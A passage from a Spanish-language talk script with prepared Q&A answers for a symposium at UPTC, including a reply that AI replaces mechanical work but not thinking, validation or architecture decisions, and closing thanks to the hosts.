> cada 3-6 meses."

### "¿Pueden compartir el guion?"
> "Sí, todo está en el repositorio. El guion, los fundamentos técnicos,
> las referencias. Link en el slide anterior."

### "¿Y si la IA me reemplaza igual?"
> "La IA reemplaza la parte mecánica del trabajo. La parte de pensar,
> de validar, de decidir arquitectura, de entender contexto de negocio,
> de comunicarse con humanos — eso sigue siendo nuestro. Y eso es lo
> que están formando ustedes acá."

## Cierre del Q&A
Agradecer a los profesores, a la UPTC, al organizador del simposio.

-->
